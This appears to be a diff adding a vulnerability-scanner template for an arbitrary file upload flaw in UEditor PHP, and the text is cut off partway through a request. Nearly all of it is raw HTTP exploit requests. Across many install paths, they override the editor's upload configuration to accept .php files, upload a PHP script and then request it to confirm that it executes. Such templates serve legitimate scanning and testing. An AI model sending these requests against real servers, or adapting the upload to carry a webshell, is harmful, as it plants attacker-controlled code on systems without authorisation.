@@ -1,0 +1,1747 @@
+id: ueditor-php-arbitrary-file-upload
+info:
+  name: UEditor PHP Arbitrary File Upload
+  author: ChiragArtani
+  severity: critical
+  description: |
+    Detects arbitrary file upload vulnerability in UEditor PHP by attempting to upload and execute a PHP file.
+
+http:
+  - raw:
+      - |
+        POST /ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /content/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=content/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /content/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/content/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /assets/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=assets/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /assets/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/assets/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /asset/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=asset/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /asset/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/asset/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /plugins/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=plugins/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /plugins/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/plugins/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /plugin/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=plugin/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /plugin/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/plugin/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /static/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=static/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /static/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/static/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /public/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=public/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /public/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/public/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /vendor/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=vendor/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /vendor/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/vendor/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /lib/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=lib/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /lib/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/lib/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /libs/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=libs/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /libs/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/libs/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /include/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=include/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /include/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/include/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /includes/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=includes/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /includes/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/includes/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=js/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /js/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/js/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /javascript/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=javascript/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /javascript/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/javascript/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /scripts/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=scripts/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /scripts/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/scripts/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /cms/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=cms/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
